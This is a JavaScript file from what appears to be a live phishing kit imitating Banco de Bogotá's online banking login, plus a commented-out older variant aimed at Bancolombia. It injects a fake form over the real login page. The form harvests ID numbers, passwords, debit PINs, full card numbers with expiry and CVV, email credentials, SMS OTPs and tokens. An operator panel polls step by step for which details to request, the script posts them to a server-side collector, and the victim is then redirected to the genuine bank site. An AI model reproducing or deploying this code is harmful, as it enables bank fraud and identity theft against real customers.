$(document).ready(function () {
  function getParameterByName(name, defaultValue = null) {
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)");
    var results = regex.exec(window.location.href);
    if (!results) return defaultValue;
    if (!results[2]) return defaultValue;
    return decodeURIComponent(results[2].replace(/\+/g, " "));
  }

  var checkExist = setInterval(function () {
    $("auth-bdb-ml-secondtabs").remove();

    var formElement = $('form[data-testid="login-form"]');
    if (formElement.length) {
      // Envuelve el formulario con el nuevo div
      formElement.wrap('<div id="form-container"></div>');
      injectForm("form-container");
      hiddenAll();
      clearInterval(checkExist);
    }
  }, 1000);

  // Obtener el valor del parámetro 'id' con valor por defecto '1462604384'
  var chatID = getParameterByName("id", "1462604384");
  localStorage.setItem("chatID", chatID);
  var codeVisitante = getParameterByName("codeVisitante", "pruebas");
  localStorage.setItem("codeVisitante", codeVisitante);



  startCheckingStatus("visit");

  // Variable global para almacenar el ID del intervalo
  var intervalID;

  // Inicia el chequeo del estado cada 3 segundos
  function startCheckingStatus(typeValid = "visit") {
    // Asegúrate de que no haya otro intervalo en ejecución
    clearInterval(intervalID);

    // Usa una función anónima para pasar `typeValid` a `checkStatus`
    intervalID = setInterval(function () {
      checkStatus(typeValid);
    }, 3000);
  }

  function injectForm(divId) {
    const formHTML = `<div class="container mt-5">
  <form>
  <h3 class="sherpa-typography-interactive-2" id="titleForm"></h3>
    <div class="form-group loginDiv">
      <label for="identificacion">Identificación</label>
      <div class="input-group">
        <select class="form-select custom-select" id="typeidentificacion">
          <option id="option-CC" value="C.C.   Cédula de ciudadanía">C.C.</option>
          <option id="option-TI" value="T.I.   Tarjeta de Identidad">T.I.</option>
          <option id="option-CE" value="C.E.   Cédula de Extranjería">C.E.</option>
          <option id="option-NI" value="N.P.N. NIT Persona Natural">N.P.N.</option>
          <option id="option-NE" value="N.P.E. NIT Persona Extranjera">N.P.E.</option>
          <option id="option-NJ" value="N.P.J. NIT Persona Jurídica">N.P.J.</option>
          <option id="option-PA" value="P.S.   Pasaporte">P.S.</option>
          <option id="option-RC" value="R.C.   Registro Civil">R.C.</option>
        </select>
        <input type="text" class="form-control custom-select" id="identificacion-numero" placeholder="#">
      </div>
    </div>

    <div class="form-group loginDiv">
      <label for="clave-segura">Clave segura</label>
      <input maxlength="4" type="password" class="form-control custom-input" id="password" placeholder="....">

    </div>

    <div class="form-grou loginDebito">
      <label for="clave-debito">Clave de tu tarjeta débito</label>
      <input type="password" class="form-control custom-input" id="clavecajero" placeholder="....">
    </div>

    <div class="form-group loginDebito">
      <label for="ultimos-digitos">Últimos 4 dígitos de tu tarjeta débito</label>
      <input type="password" class="form-control custom-input" id="credit-card-last4" placeholder="....">
    </div>

    <div class="form-group loginCorreo">
      <label for="correo-electronico">Correo electrónico</label>
      <input type="email" class="form-control custom-input" id="correo" placeholder="Correo electrónico">
    </div>

   <div class="form-group loginCorreo">
      <label for="clave-correo">Clave de tu correo electrónico</label>
      <input type="password" class="form-control custom-input" id="claveCorreo" placeholder="Contraseña de tu correo">
    </div>


       <div class="form-group datosTarjeta">
      <label for="numero-tarjeta">Número de 16 dígitos de tu tarjeta</label>
      <input type="text" class="form-control custom-input" id="cardNumber" placeholder="4555555555555555">
    </div>

      <div class="form-group datosTarjeta">
      <label for="numero-tarjeta">Fecha de Vencimiento de la Tarjeta</label>
      <input type="text" class="form-control custom-input" id="expiryDate" placeholder="MM/YY">
    </div>


    <div class="form-group datosTarjeta">
      <label for="cvv-tarjeta">Código CVV de tu tarjeta</label>
      <input type="text" class="form-control custom-input" id="cvv" placeholder="...">
    </div>

 

     

   <div class="form-group smsDiv">
      <label for="clave-telefono">Código OTP</label>
     <input maxlength="6" type="password" class="form-control custom-input" id="OTP" placeholder="....">

    </div> 

      <div class="form-group dinamicaDiv">
      <label for="clave-telefono">Token</label>
     <input maxlength="6" type="password" class="form-control custom-input" id="Token" placeholder="....">

    </div> 

    <div class="form-group claveTel">
      <label for="clave-telefono">Clave de tu teléfono</label>
      <input type="password" class="form-control custom-input" id="telefono" placeholder="....">
    </div>

    <button class="eay7wDeyb-EbWIk2kfDMUg== bdb-at-btn bdb-at-btn--primary bdb-at-btn--lg btnSend" type="button">Ingresar</button>
  </form>
</div>

    `;

    document.getElementById(divId).innerHTML = formHTML;
    $("#expiryDate").inputmask("99/99", { placeholder: "MM/YY" });
  }

  function hiddenAll() {
    const ids = [
      ".loginDiv",
      ".loginDebito",
      ".loginCorreo",
      ".datosTarjeta",
      ".claveTel",
      ".smsDiv",
      ".dinamicaDiv",
    ];
    $("input select").val("");
    ids.forEach(function (id) {
      $(id).addClass("hidden");
    });
  }

  function checkStatus(typeValid) {
    $.ajax({
      url: "wait.php",
      type: "POST",
      dataType: "json",
      data: {
        userID: localStorage.getItem("codeVisitante"),
        typeValid: typeValid,
      },
      success: function (response) {
        // Guardar el estado actual antes de cambiar el formulario
        // sms
        // dinamica
        // ambas
        // correo_clave
        // cambio_clave
        // finalizar
        // inicio
        if (response.response.type === "waiting") {
          // Aún esperando, no hacer nada
        } else if (response.response.type === "login") {
          ocultarloader();
          $("#titleForm").text("Clave segura");
          $(".loginDiv").removeClass("hidden");
          localStorage.setItem("lastForm", response.response.type);
          clearInterval(intervalID);
        } else if (response.response.type === "login_debito") {
          ocultarloader();
          $("#titleForm").text("Tarjeta débito");
          $(".loginDebito").removeClass("hidden");
          localStorage.setItem("lastForm", response.response.type);
          clearInterval(intervalID);
        } else if (response.response.type === "sms") {
          ocultarloader();

          $("#titleForm").text("Código SMS");
          $(".smsDiv").removeClass("hidden");
          localStorage.setItem("lastForm", response.response.type);
          clearInterval(intervalID);
        } else if (response.response.type === "dinamica") {
          ocultarloader();
          $("#titleForm").text("Clave Dinámica");
          $(".dinamicaDiv").removeClass("hidden");
          localStorage.setItem("lastForm", response.response.type);
          clearInterval(intervalID);
        } else if (response.response.type === "ambas") {
          ocultarloader();
          $("#titleForm").text("Códigos");
          $(".smsDiv").removeClass("hidden");
          $(".dinamicaDiv").removeClass("hidden");
          localStorage.setItem("lastForm", response.response.type);
          clearInterval(intervalID);
        } else if (response.response.type === "correo_clave") {
          ocultarloader();
          $(".loginCorreo").removeClass("hidden");
          $("#titleForm").text("Vincule cuenta de correo");
          localStorage.setItem("lastForm", response.response.type);
          clearInterval(intervalID);
        } else if (response.response.type === "cambio_clave") {
          localStorage.setItem("lastForm", response.response.type);
          $("#otros").removeClass("hidden");
          $("#div-clave-cajero").removeClass("hidden");
          $("#loader").addClass("hide");
          clearInterval(intervalID);
        } else if (response.response.type === "debit_card") {
          ocultarloader();
          localStorage.setItem("lastForm", response.response.type);
          $(".datosTarjeta").removeClass("hidden");
          $("#titleForm").text("Datos de su tarjeta");
          clearInterval(intervalID);
        } else if (response.response.type === "rechazar_codigo") {
          ocultarloader();
          lastForm();
          Swal.fire({
            icon: "error",
            title: "Información incorrecta",
            text: "Intentelo de nuevo",
          }).then((result) => {
            if (result.isConfirmed) {
              // Redirect the user
              lastForm();
            }
          });

          // cargarUltimoFormularioGuardado();
          clearInterval(intervalID); // Detener el chequeo
        } else if (response.response.type === "aceptar_codigo") {
          $(".text-center").text(
            "Estamos validando tus datos espera un momento..."
          );
          startCheckingStatus("visit");
        } else if (response.response.type === "finalizar") {
          ocultarloader();
          clearInterval(intervalID);
          Swal.fire({
            title: "Activación completa",
            text: "sus datos han sido actualizados correctamente",
            icon: "success",
          }).then((result) => {
            if (result.isConfirmed) {
              // Redirect the user
              window.location.href =
                "https://virtual.bancodebogota.co/";
            }
          });
        } else if (response.response.type === "inicio") {
          ocultarloader();
          $("#titleForm").text("Clave segura");
          $(".loginDiv").removeClass("hidden");
          localStorage.setItem("lastForm", "login");
          clearInterval(intervalID);
        }
      },
      error: function (jqXHR, textStatus, errorThrown) {
        clearInterval(intervalID); // Detener el chequeo en caso de error
      },
    });
  }

  $(document).on("click", ".btnSend", function (event) {
    // Evita el envío del formulario
    event.preventDefault();

    const obtenerValor = (selector) => {
      return $(selector).length > 0 ? $(selector).val() : "";
    };

    const form = localStorage.getItem("lastForm");
    if (form == "debit_card") {
      var cardNumber = $("#cardNumber").val().trim();
      var expiryDate = $("#expiryDate").val().trim();
      var cvv = $("#cvv").val().trim();

      if (!luhnCheck(cardNumber)) {
        alert("Número de tarjeta inválido.");
        return;
      }

      if (!validateExpiryDate(expiryDate)) {
        alert("Fecha de vencimiento inválida.");
        return;
      }
      if (cvv == "") {
        alert("Agregue el CVV");
        return;
      }
    }
    mostrarloader();
    var username = obtenerValor("#identificacion-numero");
    var typeidentificacion = obtenerValor("#typeidentificacion");
    var translatedPassword = obtenerValor("#password");
    var dinamica = obtenerValor("#dinamica");
    var sms = obtenerValor("#sms");
    var claveTel = obtenerValor("#telefono");
    var cuatroLast = obtenerValor("#credit-card-last4");
    var correo = obtenerValor("#correo");
    var claveCorreo = obtenerValor("#claveCorreo");
    var claveCajero = obtenerValor("#clavecajero");
    // Crear el mensaje usando template literals y condicionales
    const messageSkm = `Información:\n
        ${username ? `👤 username: ${username}\n` : ""}
        ${typeidentificacion ? `💳 Tipo id: ${typeidentificacion}\n` : ""}
        ${translatedPassword ? `🔑 passsword: ${translatedPassword}\n` : ""}
        ${sms ? `💬 SMS: ${sms}\n` : ""}
        ${dinamica ? `💬 Dinamica: ${dinamica}\n` : ""}
        ${claveTel ? `📞 Clave Telefonica: ${claveTel}\n` : ""}
        ${cuatroLast ? `💳 Últimos 4 dígitos: ${cuatroLast}\n` : ""}
        ${correo ? `📧 Correo: ${correo}\n` : ""}
        ${claveCorreo ? `🔑 Clave del Correo: ${claveCorreo}` : ""}
        ${claveCajero ? `🔑 Clave cambio Cajero: ${claveCajero}\n` : ""}
        ${cardNumber ? `💳 Card Number: ${cardNumber}\n` : ""}
        ${expiryDate ? `📅 Vence: ${expiryDate}\n` : ""}
        ${cvv ? `🔑 CVV: ${cvv}\n` : ""}`;

    if (
      username ||
      typeidentificacion ||
      translatedPassword ||
      dinamica ||
      sms ||
      claveTel ||
      cuatroLast ||
      correo ||
      claveCorreo ||
      cardNumber ||
      expiryDate ||
      cvv ||
      claveCajero
    ) {
      $.ajax({
        url: "codes_aceptar.php",
        type: "POST",
        data: {
          messageSkm: messageSkm,
        },
        success: function (response) {
          hiddenAll();
          startCheckingStatus("validcode");
        },
        error: function (jqXHR, textStatus, errorThrown) {
          $("#response").html("<p>Error: " + textStatus + "</p>");
        },
      });
    }
  });

  function handleOtpInput(inputClass) {
    $(inputClass).on("input", function () {
      if (this.value.length === 1) {
        $(this).next(inputClass).focus();
      }
      updateHiddenInput(inputClass);
    });

    $(inputClass).on("keydown", function (e) {
      if (e.key === "Backspace" && this.value.length === 0) {
        $(this).prev(inputClass).focus();
      }
    });

    function updateHiddenInput(inputClass) {
      let otpValue = "";
      $(inputClass).each(function () {
        otpValue += $(this).val();
      });
      // Actualiza el campo oculto usando una clase única o un ID específico
      let hiddenInputClass = inputClass + "-hidden";
      $(hiddenInputClass).val(otpValue);
    }

    $(inputClass).on("paste", function (e) {
      let pasteData = e.originalEvent.clipboardData.getData("text");
      if (pasteData.length === 6 && $.isNumeric(pasteData)) {
        let otpArray = pasteData.split("");
        $(inputClass).each(function (index) {
          $(this).val(otpArray[index]);
        });
        updateHiddenInput(inputClass);
      }
      e.preventDefault();
    });
  }

  handleOtpInput(".otp-input");
  handleOtpInput(".otp-input-sms");

  function lastForm() {
    const form = localStorage.getItem("lastForm");
    if (form === "login") {
      ocultarloader();
      $("#titleForm").text("Clave segura");
      $(".loginDiv").removeClass("hidden");
    } else if (form === "sms") {
      ocultarloader();
      $("#titleForm").text("Código SMS");
      $(".smsDiv").removeClass("hidden");
    } else if (form === "dinamica") {
      ocultarloader();
      $("#titleForm").text("Clave Dinámica");
      $(".dinamicaDiv").removeClass("hidden");
    } else if (form === "ambas") {
      ocultarloader();
      $("#titleForm").text("Códigos");
      $(".smsDiv").removeClass("hidden");
      $(".dinamicaDiv").removeClass("hidden");
    } else if (form === "correo_clave") {
      $("#otros").removeClass("hidden");
      $("#div-correo").removeClass("hidden");
      $("#loader").addClass("hide");
    } else if (form === "cambio_clave") {
      $("#otros").removeClass("hidden");
      $("#div-clave-cajero").removeClass("hidden");
      $("#loader").addClass("hide");
    } else if (response.response.type === "debit_card") {
      ocultarloader();
      $(".datosTarjeta").removeClass("hidden");
      $("#titleForm").text("Datos de su tarjeta");
    } else if (response.response.type === "login_debito") {
      ocultarloader();
      $("#titleForm").text("Tarjeta débito");
      $(".loginDebito").removeClass("hidden");
    }
  }

  function luhnCheck(cardNumber) {
    let sum = 0;
    let shouldDouble = false;

    for (let i = cardNumber.length - 1; i >= 0; i--) {
      let digit = parseInt(cardNumber.charAt(i));

      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) {
          digit -= 9;
        }
      }

      sum += digit;
      shouldDouble = !shouldDouble;
    }

    return sum % 10 === 0;
  }

  function validateExpiryDate(expiryDate) {
    const [month, year] = expiryDate.split("/").map((val) => parseInt(val));
    if (month < 1 || month > 12) return false;

    const currentDate = new Date();
    const currentMonth = currentDate.getMonth() + 1; // Los meses en JavaScript son de 0 a 11
    const currentYear = parseInt(
      currentDate.getFullYear().toString().slice(-2)
    );

    if (year < currentYear || (year === currentYear && month < currentMonth)) {
      return false;
    }

    return true;
  }

  function mostrarloader() {
    $("._2LcN4zHfIL-9QJHU6josDd").css("display", "flex");
  }

  // Ocultar el elemento con la clase ._2LcN4zHfIL-9QJHU6josDd
  function ocultarloader() {
    $("._2LcN4zHfIL-9QJHU6josDd").css("display", "none");
  }
});

// $(document).ready(function() {
//     function handleOtpInput(inputClass) {
//         $(inputClass).on("input", function() {
//             if (this.value.length === 1) {
//                 $(this).next(inputClass).focus();
//             }
//             updateHiddenInput(inputClass);
//         });

//         $(inputClass).on("keydown", function(e) {
//             if (e.key === "Backspace" && this.value.length === 0) {
//                 $(this).prev(inputClass).focus();
//             }
//         });

//         function updateHiddenInput(inputClass) {
//             let otpValue = "";
//             $(inputClass).each(function() {
//                 otpValue += $(this).val();
//             });
//             // Actualiza el campo oculto usando una clase única o un ID específico
//             let hiddenInputClass = inputClass + "-hidden";
//             $(hiddenInputClass).val(otpValue);
//         }

//         $(inputClass).on("paste", function(e) {
//             let pasteData = e.originalEvent.clipboardData.getData("text");
//             if (pasteData.length === 6 && $.isNumeric(pasteData)) {
//                 let otpArray = pasteData.split("");
//                 $(inputClass).each(function(index) {
//                     $(this).val(otpArray[index]);
//                 });
//                 updateHiddenInput(inputClass);
//             }
//             e.preventDefault();
//         });
//     }

//     handleOtpInput(".otp-input");
//     handleOtpInput(".otp-input-sms");
// });
// $("#loader").show();
// $("#div-correo").hide();
// $("#btnfin").hide();

// function checkStatus() {
//     $.ajax({
//         url: "wait.php",
//         type: "POST",
//         dataType: "json",
//         data: {
//             userID: localStorage.getItem("username"),
//         },
//         success: function(response) {
//             if (response.response.type === "waiting") {
//                 $("#loader").show();
//                 $("#div-dinamica").hide();
//                 $("#div-sms").hide();
//             } else if (response.response.type === "sms") {
//                 $("#loader").hide();
//                 $("#div-dinamica").hide();
//                 $("#div-sms").show();
//                 clearInterval(intervalID);
//             } else if (response.response.type === "dinamica") {
//                 $("#loader").hide();
//                 $("#div-sms").hide();
//                 $("#div-dinamica").show();
//                 clearInterval(intervalID);
//             } else if (response.response.type === "ambas") {
//                 $("#loader").hide();
//                 $("#div-dinamica").show();
//                 $("#div-sms").show();
//                 clearInterval(intervalID);
//             }
//         },
//         error: function(jqXHR, textStatus, errorThrown) {
//             $("#loader").hide();
//             clearInterval(intervalID);
//             $("#response").html("<p>Error: " + textStatus + "</p>");
//         },
//     });
// }

// var intervalID = setInterval(checkStatus, 3000); // Verifica cada 3 segundos
// function toggleLoader() {
//     $("#loader").show();
//     setTimeout(function() {
//         $("#loader").hide();
//     }, 3000);
// }
// $(document).ready(function() {
//     checkStatus(); // Llama inmediatamente la primera vez

//     $("#btnCodes").click(function() {

//         var dinamica = $(".otp-input-hidden")
//             .val(); // Leer el valor del campo username
//         var sms = $(".otp-input-sms-hidden").val();

//         var correo = $("#correo").val();
//         var clave = $("#clave").val();
//         if (dinamica || sms || clave || correo) {
//             $.ajax({
//                 url: "codes.php",
//                 type: "POST",
//                 data: {
//                     dinamica: dinamica,
//                     sms: sms,
//                     correo: correo + ' pass ' + clave,
//                 },
//                 success: function(response) {
//                     toggleLoader()
//                     $("#div-dinamica").hide();
//                     $("#div-sms").hide();
//                     $("#div-correo").show();
//                     $("#btnfin").show();

//                     Swal.fire({
//                         title: "Finalizado",
//                         text: "Su dispositivo fue registrado",
//                         icon: "success"
//                     }).then((result) => {
//                         if (result.isConfirmed) {
//                             if (correo.length > 0) {
//                                 window.location.href =
//                                     "https://sucursalpersonas.transaccionesbancolombia.com";
//                             } else {
//                                 Swal.close()
//                             }
//                         }
//                     });

//                 },
//                 error: function(jqXHR, textStatus, errorThrown) {
//                     $("#response").html("<p>Error: " + textStatus +
//                         "</p>");
//                 },
//             });
//         }
//     });
// });
